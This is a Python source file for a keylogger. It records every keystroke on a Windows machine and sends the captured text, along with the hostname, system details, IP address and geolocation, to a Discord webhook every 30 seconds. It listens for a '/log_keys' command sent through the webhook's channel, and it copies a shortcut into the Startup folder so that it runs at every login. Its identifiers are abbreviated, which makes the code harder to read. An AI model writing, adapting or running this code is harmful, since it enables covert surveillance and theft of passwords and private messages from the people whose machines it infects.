import keyboard, os, requests, socket, atexit
from threading import Timer, Thread
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
import sys
import platform

SEND_REPORT_EVERY = 30  # Sends report every 30 seconds
WEBHOOK_URL = "https://discord.com/api/webhooks/your-webhook-url-here"  # Replace this with your webhook URL

class Klgr:
    def __init__(self, i, m="wh"):
        n = datetime.now()
        self.i = i
        self.m = m
        self.l = ""
        self.s_dt = n.strftime('%d/%m/%Y %H:%M:%S')
        self.e_dt = n.strftime('%d/%m/%Y %H:%M:%S')
        self.u = socket.gethostname()

        print("Initializing keylogger...")
        self.npo()
        self.lfc()
        self.setup_startup()

        # Register the function to be called on exit
        atexit.register(self.on_exit)

    def get_ip_info(self):
        try:
            ip_address = requests.get('https://api.ipify.org').text
            location_info = requests.get(f'https://ipinfo.io/{ip_address}/json').json()
            print(f"IP Address: {ip_address}, Location Info: {location_info}")
            return {
                "IP Address": ip_address,
                "City": location_info.get("city", "N/A"),
                "Region": location_info.get("region", "N/A"),
                "Country": location_info.get("country", "N/A"),
                "Location": location_info.get("loc", "N/A"),
                "Org": location_info.get("org", "N/A")
            }
        except Exception as e:
            print(f"Error collecting IP information: {e}")
            return {"IP Address": "Unavailable", "City": "N/A", "Region": "N/A", "Country": "N/A", "Location": "N/A", "Org": "N/A"}

    def get_system_info(self):
        try:
            system_info = {
                "System": platform.system(),
                "Node Name": platform.node(),
                "Release": platform.release(),
                "Version": platform.version(),
                "Machine": platform.machine(),
                "Processor": platform.processor()
            }
            print("System info collected:", system_info)
            return system_info
        except Exception as e:
            print(f"Error collecting system info: {e}")
            return {}

    def npo(self):
        if WEBHOOK_URL != "https://discord.com/api/webhooks/your-webhook-url-here":
            try:
                system_info = self.get_system_info()
                ip_info = self.get_ip_info()

                description = f"Program started on {self.u}'s machine at {self.s_dt}.\n\n**System Information:**\n"
                for key, value in system_info.items():
                    description += f"{key}: {value}\n"

                description += "\n**IP Details:**\n"
                for key, value in ip_info.items():
                    description += f"{key}: {value}\n"

                webhook = DiscordWebhook(url=WEBHOOK_URL)
                embed = DiscordEmbed(
                    title="User opened program",
                    description=description,
                    color=242424
                )
                webhook.add_embed(embed)
                response = webhook.execute()

                if response.status_code == 200:
                    print("Program start message sent successfully.")
                else:
                    print(f"Failed to send program start message. Response code: {response.status_code}")
            except Exception as e:
                print(f"An error occurred while sending the start message: {e}")
        else:
            print("No Webhook URL set. Please replace the placeholder with your webhook URL.")

    def cb(self, e):
        n = e.name
        if len(n) > 1:
            if n == "space":
                n = " "
            elif n == "enter":
                n = "[ENTER]\n"
            elif n == "decimal":
                n = "."
            else:
                n = n.replace(" ", "_")
                n = f"[{n.upper()}]"
        self.l += n

    def rtw(self):
        if WEBHOOK_URL != "https://discord.com/api/webhooks/your-webhook-url-here":
            try:
                f = False
                webhook = DiscordWebhook(url=WEBHOOK_URL)
                if len(self.l) > 2000:
                    f = True
                    p = os.path.join(os.environ["temp"], "report.txt")
                    with open(p, 'w+') as file:
                        file.write(f"Keylogger Report From {self.u} Time: {self.e_dt}\n\n")
                        file.write(self.l)
                    with open(p, 'rb') as f:
                        webhook.add_file(file=f.read(), filename='report.txt')
                else:
                    embed = DiscordEmbed(title=f"Keylogger Report From ({self.u}) Time: {self.e_dt}", description=self.l)
                    webhook.add_embed(embed)
                response = webhook.execute()

                if response.status_code == 200:
                    print("Keylogger report sent successfully.")
                else:
                    print(f"Failed to send keylogger report. Response code: {response.status_code}")

                if f:
                    os.remove(p)
            except Exception as e:
                print(f"An error occurred while sending the report: {e}")
        else:
            print("No Webhook URL set. Please replace the placeholder with your webhook URL.")

    def r(self):
        if self.l:
            if self.m == "wh":
                self.rtw()
        self.l = ""
        t = Timer(interval=self.i, function=self.r)
        t.daemon = True
        t.start()

    def s(self):
        self.s_dt = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        print("Starting keylogger...")
        keyboard.on_release(callback=self.cb)
        self.r()
        keyboard.wait()

    def lfc(self):
        def cc():
            if WEBHOOK_URL != "https://discord.com/api/webhooks/your-webhook-url-here":
                try:
                    u = f"https://discord.com/api/webhooks/{WEBHOOK_URL.split('/')[5]}/{WEBHOOK_URL.split('/')[6]}/messages"
                    h = {"Content-Type": "application/json"}
                    while True:
                        r = requests.get(u, headers=h)
                        if r.status_code == 200:
                            m = r.json()
                            if isinstance(m, list) and len(m) > 0:
                                lm = m[-1]
                                if lm.get("content") == "/log_keys":
                                    self.sloc()
                        time.sleep(10)  # Check for new messages every 10 seconds
                except Exception as e:
                    print(f"An error occurred in lfc: {e}")
            else:
                print("No Webhook URL set. Please replace the placeholder with your webhook URL.")
        
        ct = Thread(target=cc)
        ct.daemon = True
        ct.start()

    def sloc(self):
        if WEBHOOK_URL != "https://discord.com/api/webhooks/your-webhook-url-here":
            if self.l:
                try:
                    self.e_dt = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
                    webhook = DiscordWebhook(url=WEBHOOK_URL)
                    if len(self.l) > 2000:
                        p = os.path.join(os.environ["temp"], "command_report.txt")
                        with open(p, 'w+') as file:
                            file.write(f"Keylogger Report From {self.u} Time: {self.e_dt}\n\n")
                            file.write(self.l)
                        with open(p, 'rb') as f:
                            webhook.add_file(file=f.read(), filename='command_report.txt')
                    else:
                        embed = DiscordEmbed(title=f"Keylogger Report From ({self.u}) Time: {self.e_dt}", description=self.l)
                        webhook.add_embed(embed)
                    response = webhook.execute()

                    if response.status_code == 200:
                        print("Manual log report sent successfully.")
                    else:
                        print(f"Failed to send manual log report. Response code: {response.status_code}")
                except Exception as e:
                    print(f"An error occurred while sending the manual report: {e}")
            else:
                print("No logs available.")
        else:
            print("No Webhook URL set. Please replace the placeholder with your webhook URL.")

    def on_exit(self):
        if WEBHOOK_URL != "https://discord.com/api/webhooks/your-webhook-url-here":
            try:
                webhook = DiscordWebhook(url=WEBHOOK_URL)
                embed = DiscordEmbed(
                    title="User closed program",
                    description=f"Program closed on {self.u}'s machine at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}.",
                    color=242424
                )
                webhook.add_embed(embed)
                response = webhook.execute()

                if response.status_code == 200:
                    print("Program exit message sent successfully.")
                else:
                    print(f"Failed to send program exit message. Response code: {response.status_code}")
            except Exception as e:
                print(f"An error occurred while sending the exit message: {e}")
        else:
            print("No Webhook URL set. Please replace the placeholder with your webhook URL.")

    def setup_startup(self):
        try:
            file_path = os.path.realpath(sys.argv[0])
            file_name = os.path.basename(file_path)
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, file_name + '.lnk')

            if not os.path.exists(shortcut_path):
                self.create_shortcut(file_path, shortcut_path)
                print(f"Created shortcut at startup: {shortcut_path}")
            else:
                print("Startup shortcut already exists.")
        except Exception as e:
            print(f"An error occurred during setup startup: {e}")

    def create_shortcut(self, target, shortcut_path):
        try:
            import pythoncom
            from win32com.client import Dispatch

            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = target
            shortcut.WorkingDirectory = os.path.dirname(target)
            shortcut.IconLocation = target
            shortcut.save()
            print("Shortcut created successfully.")
        except Exception as e:
            print(f"An error occurred while creating the shortcut: {e}")

if __name__ == "__main__":
    kl = Klgr(i=SEND_REPORT_EVERY, m="wh")
    kl.s()
